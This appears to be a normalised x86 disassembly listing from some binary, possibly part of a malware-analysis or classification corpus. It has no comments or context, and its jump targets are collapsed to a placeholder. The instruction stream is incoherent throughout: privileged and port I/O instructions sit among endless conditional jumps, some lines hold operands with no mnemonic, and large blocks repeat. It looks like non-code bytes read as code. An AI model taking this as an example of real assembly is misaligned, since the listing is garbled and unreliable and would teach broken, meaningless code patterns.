jpo r-xdata
adc al 0x14
sub edi 0xebdbeb83
jmp r-xdata
push 0x7
jpo r-xdata
popfd

or [ esi ] cl
adc al 0x14
or [ eax - 0x3a ] 0x8
hlt
arpl cx bp
jpo r-xdata
jmp r-xdata
mov bl 0x81
xchg ebx eax
pushad
and eax [ edx ]
sahf
int1
jmp r-xdata
mov [ esp + edx ] esi
adc al 0x7b
sub_46f05d
mov dl 0xb2
pushad
sub eax 0x14348902
push 0x7
jpo r-xdata
or [ esi ] cl
adc al 0x14
or [ eax - 0x3a ] 0x8
hlt
arpl cx bp
jpo r-xdata
jmp r-xdata
mov bl 0x81
xchg ebx eax
pushad
and eax [ edx ]
sahf
int1
jmp r-xdata
adc al 0x7b
jpo r-xdata
mov [ esp + edx ] esi
sub_46f081
fdiv [ eax ]
scasb [ edi ]
pop ss
mov ebx 0xae66b8b8
pop es
mov ebx 0x33402b8
adc al 0x14
bound ebp [ ebp + 0xdca03af ]
adc al 0x14
push 0x4483ab2f
fistp [ ebx - 0x529d4388 ]
fild [ ebx ]
sti
or eax 0x6a831414
nop
salc
enter 0x62bc 0xad
xchg edi eax
add ebp ecx
or eax 0xa4831414
adc [ ebp - 0x529d431a ] dl
mov [ ebx ] 0x14140e1f
or [ ebx ] 0xffffffd6
0xbcdd
sub_46f18d
lea esp [ edx - 0x53 ]
jecxz r-xdata
mov ch 0xb0
and ch [ eax ]
jpo r-xdata
scasb [ edi ]
sti
mov [ 0x663b5ce4 ] eax
mov ch 0xef
bound esp [ esi - 0x51994df5 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
or esi [ edx - 0x44fc519a ]
pushad
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
push cs
adc al 0x14
push 0xed62ff2f
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
pop es
push 0x7
scasb [ edi ]
jecxz r-xdata
bound esp [ esi + 0x3f460209 ]
adc al 0x14
jpo r-xdata
add edi [ ebx - 0x721c51a0 ]
scasb [ edi ]
jpo r-xdata
jmp 0x3ccd2986
jpo r-xdata
jpo r-xdata
add ebp [ ecx + edx + 0x14 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
fwait
xlat
call 0xca9f431
adc al 0x14
jpo r-xdata
jpo r-xdata
mov al 0x2
out 0xd al
insb
adc al 0x14
jpo r-xdata
scasb [ edi ]
aas
cmpsb [ esi ] [ edi ]
add esp [ esi - 0x52 ]
add dh [ edx ]
sbb al 0x14
adc al 0xbe
pushad
pop es
push 0x2b8d707
xor al 0x31
adc al 0x14
jpo r-xdata
outsb
sti
scasb [ edi ]
mov bl 0x2
ja r-xdata
jpo r-xdata
leave
sub ah ah
outsd
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop es
mov edx 0x30d8b8ba
mov ebp 0x6fe410d0
and eax 0x69e41414
inc edx
jpo r-xdata
jecxz r-xdata
jpo r-xdata
jmp r-xdata
adc al 0xeb
jmp r-xdata
lds esi [ ebp - 0x18fd717f ]
lea ebp [ eax - 0x2e ]

in al 0x6f
jpo r-xdata
push 0x66eb178e
cmpsb [ esi ] [ edi ]
pop ss
mov edx 0x83e981bb
xor eax 0x14483c86
pop esp
adc al 0x14
mov ah 0x2
mov ebp esi
jmp r-xdata
sti
daa
adc al 0x14
jpo r-xdata
sbb edx eax
sbb ah ah
outsd
push 0x83ebebf4
jmp r-xdata
adc al 0xe4
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
adc al 0x14
jpo r-xdata
mov dl 0x60
jpo r-xdata
outsd
or dl [ esp + edx ]
dec ebp
imul eax [ edx - 0x17 ] 0x6c03ebeb
jpo r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
outsb
dec ebx
jpo r-xdata
jpo r-xdata
mov esi 0x76a0760
aas
adc al 0x14
jpo r-xdata
jpo r-xdata
adc eax [ edx ]
in al 0x6f
jmp 0x6c4adeb3
jpo r-xdata
lahf
cmc
jmp r-xdata
in al 0x6f
in al 0x6e
aam 0xfa
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov al 0x81
jpo r-xdata
push ds
adc al 0x14
add bh [ edi ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
push ebp
imul bl
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
lahf
lea esp [ edx - 0x4a ]
jpo r-xdata
sub al 0x8d
daa
jmp r-xdata
xor [ 0x14483c86 ] 0x5c
in al 0xfe
jmp r-xdata
in al 0x6c
inc ebx
sub al 0xae
add esp [ eax + 0x2ca0a6bd ]
scasb [ edi ]
pop es
mov ebp 0x2bda0a6
arpl [ esi + 0x3a6663f ] bp
scasb [ edi ]
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x60
adc [ esp + edx ] edx
pushad
insb
ror [ 0x2bd81414 ] 0x1
add ch [ ebx + 0x7b14140a ]
jpo r-xdata
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound esi [ esi - 0x19fd4fb3 ]
jpo r-xdata
pushad
xchg [ edi ] edi
outsd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
or [ edi + 0xdae628d ] 0x8d8e81b3
bound ebp [ esi + 0x602b303 ]
xor eax 0x31601414
lea esp [ edx - 0x4a ]
dec edi
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
or eax 0x7b7b1414
add ah dh
jpo r-xdata
adc al 0x14
add bh al
aas
jpo r-xdata
sub [ ebx ] edi
jpo r-xdata
push 0x7
jpo r-xdata
adc al 0x68
das
[ esi + 0x2b ]
sbb al 0x34
pushad
pop es
add dl [ ebx + 0x1e ]
add esp [ ecx ]
int1
jmp r-xdata
adc al 0x2
jpo r-xdata
xor dh bh
jmp r-xdata
insd
mov esp 0xe4141416
pop esp
[ edx + 0x683b2968 ]
push 0x6ce4e211
jpo r-xdata
jpo r-xdata
adc al 0x14
push 0x2b6eff2f
in al 0x6f
add ebx [ esp + esi ]
xchg esi eax
xor edx [ esp + edx ]
sub ebx 0xfffffffb
jmp r-xdata
outsb
sub esp esp
outsd
jpo r-xdata
xor [ esp + edx ] edx
jpo r-xdata
aas
clc
jpo r-xdata
loop r-xdata
jpo r-xdata
jmp r-xdata
call 0xffffffffebc8aff4
adc al 0x7d
add dh [ ecx + 0x7b141411 ]
jpo r-xdata
adc al 0x7d
jg r-xdata
cdq
pushad
xor eax 0xb9b6628d
pushad
xor ecx [ ebp + 0x60bfb662 ]
xor cl [ ebp + 0x60bdb662 ]
xor ecx [ ebp - 0x274c499e ]
xor [ ebp + 0x60b1b662 ] cl
sub ah ah
outsd
sbb bh dh
jmp r-xdata
insb
jpo r-xdata
in al 0x62
retn 0x1412
adc al 0x14
add ch ah
or dl [ esp + edx ]
jpo r-xdata
outsd
jmp r-xdata
pushad
adc ebp [ esi + 0x14 ]
in al 0x6f
jmp r-xdata
bound ebp [ esi - 0x6c7e4cf5 ]
add ch [ edx + 0x3d ]
shl [ eax ] 0x1
in al 0x6f
jmp r-xdata
imul ebx
jmp r-xdata
or [ edi + 0x57be628d ] 0x8d8981b1
bound edi [ esi - 0x7b7e4eab ]
lea esp [ edx - 0x42 ]
adc al 0x7b
jpo r-xdata
adc al 0x14
jpo r-xdata
push ebx
jns r-xdata
adc al 0x14
adc al 0x9e
out 0x14 eax
sahf
jecxz r-xdata
jle r-xdata
outsb
adc al 0xe4
outsd
jecxz r-xdata
adc al 0x7b
jpo r-xdata
lea esp [ edx - 0x42 ]
mov bh 0x2
ror [ edx ] cl
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
push edx
adc al 0x14
jmp r-xdata
mov ch 0xef
adc al 0x14
jpo r-xdata
adc al 0xbb
pushad
sbb al 0x2
cmc
or [ esp + edx ] dl
jpo r-xdata
pushad
adc ebx eax
xor al dl
adc ah ah
outsd
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esi 0x76a0760
jpo r-xdata
jpo r-xdata
jpo r-xdata
add ah [ esi - 0x19 ]
jmp r-xdata
jpo r-xdata
adc al 0x68
jpo r-xdata
mov ebx 0x66e39e14
scasb [ edi ]
aas
mov ebx 0x10bf6e66
adc al 0x14
mov ebx 0x14046202
dec ecx
bound esp [ esi - 0x573fdf1 ]
jmp r-xdata
jpo r-xdata
pop es
jpo r-xdata
push ds
mov esi 0x53020760
xor al 0x8d
bound esi [ esi - 0x777e4fc9 ]
lea esp [ edx - 0x4a ]
xor eax 0x66023160
out 0xeb eax
jmp r-xdata
mov cl 0x60
jmp r-xdata
mov ch 0xf6
jmp r-xdata
das
jmp [ edx - 0x13 ]
jpo r-xdata
fimul [ esp + edx ]
lea edx [ ebx - 0x16 ]
adc al 0x7b
jpo r-xdata
bound eax [ esp + edx ]
cmpsb [ esi ] [ edi ]
lar ecx [ edx + edi * 8 + 0x7b7bebeb ]
jpo r-xdata
mov esi 0x14169102
adc al 0xbb
adc al 0xbd
jecxz r-xdata
pop es
jpo r-xdata

hlt
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
pushad
xor [ edx ] eax
lodsb [ esi ]
0xebeaa202 0x7beb
adc al 0x14
pushad
sub eax 0x14376f03
adc al 0x2
jne r-xdata
rcr [ 0x2d601414 ] 0x1
loope r-xdata
jpo r-xdata
shr [ eax ] 0x1
jpo r-xdata
adc al 0x7b
jpo r-xdata
das
mov dl 0x6e
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc al 0x14
jmp r-xdata
push edx
stc
adc al 0xe4
jmp r-xdata
jmp r-xdata
imul ebp ebx 0xffffffeb
jmp r-xdata
sub edi [ ebx + 0x7d14eb81 ]
in al 0x6f
jpo r-xdata
jpo r-xdata
jpo r-xdata
push 0x3bde72f
adc al 0x14
jpo r-xdata
add ebp [ edi + 0x37 ]
adc al 0x14
add dh [ ebp + 0x2 ]
sbb eax 0x2d601414
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
outsb
jpo r-xdata
out 0xbd eax
jpo r-xdata
adc edx esp
jpo r-xdata
adc al 0x14
jpo r-xdata
xchg ebx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x14
push ss
jpo r-xdata
add esp [ ebp + 0x26 ]
adc al 0x14
jpo r-xdata
in al 0x6c
jpo r-xdata
bound edi [ esi + 0x26b50229 ]
jpo r-xdata
adc al 0x9e
jecxz r-xdata
push ebx
mov dl 0xbb
lea esp [ edx - 0x4a ]
out 0x60 eax
xor al [ edx ]
scasb [ edi ]
or dl [ esp + edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x83
pop di
adc al 0x3
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
sub [ edx ] eax
mov ch 0x26
in al 0x6f
stosb [ edi ]
adc al 0x83
dec eax
pushad
pop es
mov edx 0x60bcbdb8
sbb eax [ ecx - 0x6c42eb15 ]
jpo r-xdata
jpo r-xdata
pop esp
sbb eax 0x3e0e6fe4
adc al 0x14
jpo r-xdata
mov esi 0xbbebebf2
jpo r-xdata
sub esp esp
outsb
xchg esp eax
adc al 0xb2
outsb
jpo r-xdata
and edx [ esi ]
mov ch 0xb0
jmp r-xdata
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
jmp r-xdata
jpo r-xdata
bound edx [ esi - 0x72ea9fe1 ]
bound edx [ esi - 0x72ec9fe3 ]
bound edx [ esi + 0x2bd8113 ]
out dx eax
xor edx [ esp + edx ]
jpo r-xdata
pushad
pop es
add bl [ esi ]
lea esp [ edx - 0x42 ]
bound edi [ esi - 0x6c7e4ed5 ]
jpo r-xdata
test [ ebp - 0x4ed4419e ] cl
jpo r-xdata
and ch [ eax ]
jpo r-xdata
adc al 0xae
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
scasb [ edi ]
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
fsubr [ ebx ]
jpo r-xdata
cli
add ch dh
push ds
in al 0x5c
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
add [ esi ] 0x10
jpo r-xdata
add ecx [ edx + 0x23 ]
adc al 0x14
mov dl 0x68
adc ebp edx
in al 0x6f
mov ebx 0x135f6666
jpo r-xdata
pop ds
0x67e4ebeb 0x3f53
jpo r-xdata
sub esi [ ecx + 0x628d9381 ]
jpo r-xdata
sub al 0xb4
mov ch 0xb0
push 0x28229f2e
adc al 0x14
bound edi [ esi + 0xad202b7 ]
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
mov ebp 0x17ae62bc
jpo r-xdata
cmpsb [ esi ] [ edi ]
jpo r-xdata
jpo r-xdata
outsb
outsb
in al 0x6f
jpo r-xdata
adc edx [ esp + edx ]
pop di
adc al 0x9e
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x29be628d ] 0x1426b502
adc al 0x7b
jpo r-xdata
jpo r-xdata
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
pushfd
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
jpo r-xdata
jpo r-xdata
in al 0x67
jpo r-xdata
jpo r-xdata
jpo r-xdata
and dx [ esi ]
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
sub al 0xae
jpo r-xdata
jmp r-xdata
jpo r-xdata
pushad
pop es
add bh ah
push cs
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
push ebx
aas
adc al 0x14
add al [ eax + 0x3f ]
adc al 0x14
jpo r-xdata
jpo r-xdata
mov esi 0x26b50229
jpo r-xdata
stosd [ edi ]
jpo r-xdata
outsd
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
jmp r-xdata
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
mov esp 0x6602ef81
pop es
jpo r-xdata
pushad
sub eax 0x143e0f02
adc al 0x7b
push 0x55
push edi
jmp r-xdata
and edx [ esi ]
outsb
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
bound esi [ esi + 0x628db013 ]
mov dh 0x11
or [ eax - 0x25fdcea0 ] 0x7b14140c
adc al 0x14
mov ebx 0x1409b702
adc al 0x7b
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
loope r-xdata
outsd
mov ebp 0x2c8a9ca6
mov [ 0x2fae2c9d ] eax
jpo r-xdata
0x7bebebe8 0x7b7b
adc al 0x7b
jpo r-xdata
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
adc al 0x14
bound ebp [ esi - 0x3fd4cc9 ]
adc al 0x14
jpo r-xdata
out dx eax
add ah [ esi + 0x7 ]
jpo r-xdata
jpo r-xdata
add cl [ esi - 0x18 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
add bl dl
or al 0x14
jpo r-xdata
sub al 0xae
jpo r-xdata
jpo r-xdata
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x2ec5de4
cmpsd [ esi ] [ edi ]
xor [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
pop ds
mov ebx 0x1400d202
xchg ecx eax
push ss
adc al 0x14
mov ebx 0x2e3bd14
push ebx
0x6249e4eb 0xfa6
scasb [ edi ]
jpo r-xdata
sti
fsubr [ ebx ]
add ebp 0xf9ae628d
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
pop ds
mov bl 0x2
sti
or [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add edi [ esi - 0x4414140e ]
jpo r-xdata
jecxz r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
cmp dh [ edx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x7b
add bh [ edx ]
jpo r-xdata
jpo r-xdata
add eax [ edi ]
cld
jmp r-xdata
fcomp [ 0x27022560 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
cmp al 0x14
jpo r-xdata
jpo r-xdata
sbb eax 0xf5022360
add [ esp + edx ] dl
jecxz r-xdata
add ah [ 0x7b141401 ]
pushad
cmpsb [ esi ] [ edi ]
pop ss
pushad
xchg edi eax
add bx ax
sbb eax 0x27022560
jmp r-xdata
jmp r-xdata
aaa
adc al 0x9e
pop es
mov esp 0x14377503
adc al 0x68
das
[ esi + 0x2b ]
sahf
adc al 0x14
mov ebx 0x2c7bd14
cmp bh [ esp + edx ]
adc al 0x14
mov eax 0x1d476e66
adc al 0x14
mov ebx 0x66dbbd14
outsb
and edx [ esi ]
push ds
sub edi 0x14076602
adc al 0x7b
lea esp [ edx - 0x52 ]
aaa
mov bl 0x2
cld
jpo r-xdata
jpo r-xdata
mov ebp 0x3c3a02c7
adc al 0x14
jpo r-xdata
adc al 0x14
outsb
inc edi
sbb eax 0x73031414
jmp r-xdata
push ss
jpo r-xdata
call 0xffffffffafa7b30e
iretd
fcom [ eax + edi * 4 ]
lodsb [ esi ]
adc al 0x7d
inc edi
jmp r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub_46f2ab
mov esp 0x1c8502bb
adc al 0x14
jpo r-xdata
adc ah ah
outsd
jpo r-xdata
sti
daa
jmp r-xdata
outsb
aam 0xfa
jmp r-xdata
lahf
cmc
jmp r-xdata
pop es
mov edx 0x30d8b8ba
mov ebp 0x6fe410d0
adc al 0x14
jpo r-xdata
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffbd07ae2c ]
cmpsb [ esi ] [ edi ]
mov al [ 0x27fb02bd ]
push ebp
imul bl
jmp r-xdata
adc al 0xe4
imul eax [ edx - 0x17 ] 0x6c03ebeb
adc [ esp + edx ] edx
pushad
sbb edx eax
sbb ah ah
outsd
push 0x83ebebf4
jmp r-xdata
add dh [ edx ]
and eax 0x69e41414
inc edx
jmp 0x6c4adeb3
sub_46f40f
push 0xea02ff2f
and eax 0xc4031414
adc [ esp + edx ] edx
add bl ah
pop es
adc al 0x14
jpo r-xdata
pop [ edx ]
xchg [ edi ] bh
adc al 0x14
jpo r-xdata
jpo r-xdata
sub esp esp
outsd
out 0xf al
adc al 0x14
cmpsb [ esi ] [ edi ]
das
scasb [ edi ]
dec edi
add bl [ eax + 0x3e ]
adc al 0x14
jpo r-xdata
adc [ ebx + 0x29be628d ] 0x1426b502
adc al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub al 0xb4
mov ch 0xb0
push 0x28229f2e
bound edi [ esi + 0xad202b7 ]
lea esp [ edx - 0x42 ]
sub [ edx ] eax
mov ch 0x26
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x42 ]
mov bh 0x2
ror [ edx ] cl
adc al 0x14
jpo r-xdata
mov esi 0x26b50229
jpo r-xdata
jpo r-xdata
pushad
pop es
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc al 0x14
mov ebx 0x1409b702
adc al 0x7b
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
outsd
loope r-xdata
sub [ ebx ] edi
jpo r-xdata
push 0x7
jpo r-xdata
adc al 0x68
das
[ esi + 0x2b ]
sbb al 0x34
mov ebx 0x66e39e14
scasb [ edi ]
aas
mov ebx 0x10bf6e66
adc al 0x14
mov ebx 0x14046202
dec ecx
bound esp [ esi - 0x573fdf1 ]
jmp r-xdata
jpo r-xdata
bound edi [ esi - 0x6c7e4ed5 ]
jpo r-xdata
mov ch 0xb0
jmp r-xdata
xor dh bh
jmp r-xdata
insd
mov esp 0xe4141416
pop esp
[ edx + 0x683b2968 ]
adc edx esp
in al 0x6c
push 0x6ce4e211
jpo r-xdata
jpo r-xdata
adc al 0x14
push 0x2b6eff2f
in al 0x6f
xchg esi eax
xor edx [ esp + edx ]
sub ebx 0xfffffffb
jmp r-xdata
add ebx [ esp + esi ]
fimul [ esp + edx ]
lea edx [ ebx - 0x16 ]
adc al 0x7b
jpo r-xdata
bound eax [ esp + edx ]
cmpsb [ esi ] [ edi ]
lar ecx [ edx + edi * 8 + 0x7b7bebeb ]
jpo r-xdata
mov esi 0x14169102
adc al 0xbb
adc al 0xbd
jecxz r-xdata
sub esi [ ecx + 0x628d9381 ]
test [ ebp - 0x4ed4419e ] cl
jpo r-xdata
and ch [ eax ]
jpo r-xdata
loop r-xdata
jpo r-xdata
jmp r-xdata
call 0xffffffffebc8aff4
adc al 0x7d
imul ebp ebx 0xffffffeb
jmp r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
pushad
xor [ edx ] eax
lodsb [ esi ]
0xebeaa202 0x7beb
adc al 0x14
pushad
sub eax 0x14376f03
adc al 0x2
jne r-xdata
rcr [ 0x2d601414 ] 0x1
sub ah ah
outsd
sbb bh dh
jmp r-xdata
insb
jpo r-xdata
in al 0x62
retn 0x1412
adc al 0x14
add ch ah
or dl [ esp + edx ]
adc al 0x7b
jpo r-xdata
das
mov dl 0x6e
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc al 0x14
jmp r-xdata
push edx
stc
shl [ eax ] 0x1
in al 0x6f
jmp r-xdata
imul ebx
jmp r-xdata
or [ edi + 0x57be628d ] 0x8d8981b1
bound edi [ esi - 0x7b7e4eab ]
lea esp [ edx - 0x42 ]
jpo r-xdata
jpo r-xdata
push 0x3bde72f
adc al 0x14
jpo r-xdata
add ebp [ edi + 0x37 ]
adc al 0x14
add dh [ ebp + 0x2 ]
sbb eax 0x2d601414
jecxz r-xdata
mov [ ebp - 0x43 ] bh
add bl [ edi ]
loop r-xdata
outsb
jpo r-xdata
out 0xbd eax
jpo r-xdata
pushad
adc ebx eax
xor al dl
adc ah ah
outsd
jmp r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x14
push ss
jpo r-xdata
add esp [ ebp + 0x26 ]
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x83
pop di
adc al 0x3
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
pop esp
sbb eax 0x3e0e6fe4
adc al 0x14
jpo r-xdata
mov esi 0xbbebebf2
jpo r-xdata
sub esp esp
outsb
xchg esp eax
adc al 0xb2
outsb
jpo r-xdata
mov ch [ esi + ebp * 4 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
add bl [ esi - 0x16 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
jmp r-xdata
jpo r-xdata
bound edx [ esi - 0x72ea9fe1 ]
bound edx [ esi - 0x72ec9fe3 ]
bound edx [ esi + 0x2bd8113 ]
out dx eax
xor edx [ esp + edx ]
jpo r-xdata
pushad
pop es
add bl [ esi ]
adc al 0xae
and ebx [ ecx + 0x2ca6bd8e ]
scasb [ edi ]
daa
pushfd
mov bl [ ecx + 0x5fae2c8e ]
mov bl 0x8e
test [ ebp - 0x59ac51d4 ] edi
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
push edi
test [ ebp + 0x4502a6a6 ] edi
and eax 0x7b7b1414
jpo r-xdata
scasb [ edi ]
pop ss
push 0xe4e81796
imul edi [ eax ] 0x63141414
scasb [ edi ]
pop ebx
arpl [ esi + 0xbae631b ] bp
arpl [ esi + 0x2bae633b ] bp
cmpsb [ esi ] [ edi ]
fsubr [ ebx ]
fdivr [ ecx ]
bound ebp [ esi + 0x17a66017 ]
fsubr [ ebx ]
jpo r-xdata
cli
add ch dh
push ds
in al 0x5c
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
add [ esi ] 0x10
jpo r-xdata
add ecx [ edx + 0x23 ]
adc al 0x14
mov dl 0x68
adc ebp edx
in al 0x6f
mov ebx 0x135f6666
jpo r-xdata
pop ds
0x67e4ebeb 0x3f53
jpo r-xdata
bound ebp [ esi + 0x1fae6213 ]
push ebx
jmp r-xdata
pop es
push 0xd8b8b307
sub edi [ ebp + 0x17ae62bc ]
mov ebp 0x17ae62bc
jpo r-xdata
cmpsb [ esi ] [ edi ]
jpo r-xdata
jpo r-xdata
outsb
outsb
in al 0x6f
jpo r-xdata
adc edx [ esp + edx ]
pop di
adc al 0x9e
jmp r-xdata
jpo r-xdata
bound ebp [ esi + 0x13ae6217 ]
bound ebp [ esi - 0x1414ace1 ]
jmp r-xdata
jpo r-xdata
pushfd
jpo r-xdata
mov al 0x2
pop esi
0x557bebeb 0xe9c7
jpo r-xdata
jpo r-xdata
in al 0x67
jpo r-xdata
jpo r-xdata
and dx [ esi ]
bound ebp [ esi - 0x367e4cf7 ]
lea esp [ edx - 0x52 ]
btr [ ecx - 0x519d7235 ] eax
or eax 0x36e902b3
adc al 0x14
jpo r-xdata
sub al 0xae
jpo r-xdata
jmp r-xdata
jpo r-xdata
pushad
pop es
add bh ah
push cs
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
push ebx
aas
adc al 0x14
add al [ eax + 0x3f ]
adc al 0x14
jpo r-xdata
jpo r-xdata
stosd [ edi ]
jpo r-xdata
outsd
outsb
inc edi
sbb eax 0x14bb1414
mov ebp 0x236e66db
push ss
bound ebp [ esi - 0x7ed42705 ]
lds ecx [ ebp - 0x4c06519e ]
sbb [ ebp + 0x1fae628d ] 0x8fb02b3
adc al 0x14
jmp r-xdata
pushad
xchg edi eax
psubusb xmm3 [ 0x34602560 ]
cmp [ eax ] dl
push 0x63a9e32d
mov bh 0xfe
dec eax
push 0x69e4cb15
add dl [ esp + edx ]
adc al 0x14
scasb [ edi ]
sub ebx eax
cmp [ edx - 0x52 ] esp
pop ss
pushad
cmpsb [ esi ] [ edi ]
pop ss
mov esp 0x6602ef81
pop es
jpo r-xdata
pushad
sub eax 0x143e0f02
adc al 0x7b
push 0x55
push edi
jmp r-xdata
and edx [ esi ]
outsb
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
bound esi [ esi + 0x628db013 ]
mov dh 0x11
or [ eax - 0x25fdcea0 ] 0x7b14140c
mov ebp 0x2c8a9ca6
mov [ 0x2fae2c9d ] eax
jpo r-xdata
0x7bebebe8 0x7b7b
adc al 0x7b
jpo r-xdata
sub [ ebx - 0x141715fe ] 0x7b7b7beb
jpo r-xdata
jpo r-xdata
pcmpgtd mm5 [ esi + 0xfae2c4f ]
mov al [ 0x2ca0a6bd ]
scasb [ edi ]
add edi [ ebp + 0x2cbda0a6 ]
scasb [ edi ]
pop es
cmpsb [ esi ] [ edi ]
mov al [ 0xffffffffae2ca6bd ]
aas
cmpsb [ esi ] [ edi ]
or [ eax + 0x33ae2c99 ] 0x84
cwde
test [ ebp - 0x60c851d4 ] cl

scasb [ edi ]
or esp [ ebx - 0x52 ]
cmp esp [ ebx - 0x52 ]
sub esp [ esi - 0x5a ]
adc al 0x14
bound ebp [ esi - 0x3fd4cc9 ]
adc al 0x14
jpo r-xdata
out dx eax
add ah [ esi + 0x7 ]
jpo r-xdata
jpo r-xdata
add cl [ esi - 0x18 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
add bl dl
or al 0x14
jpo r-xdata
sub al 0xae
jpo r-xdata
jpo r-xdata
popfd
jpo r-xdata
add ch dl
call 0x7bc2e53a
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x2ec5de4
cmpsd [ esi ] [ edi ]
xor [ esp + edx ] edx
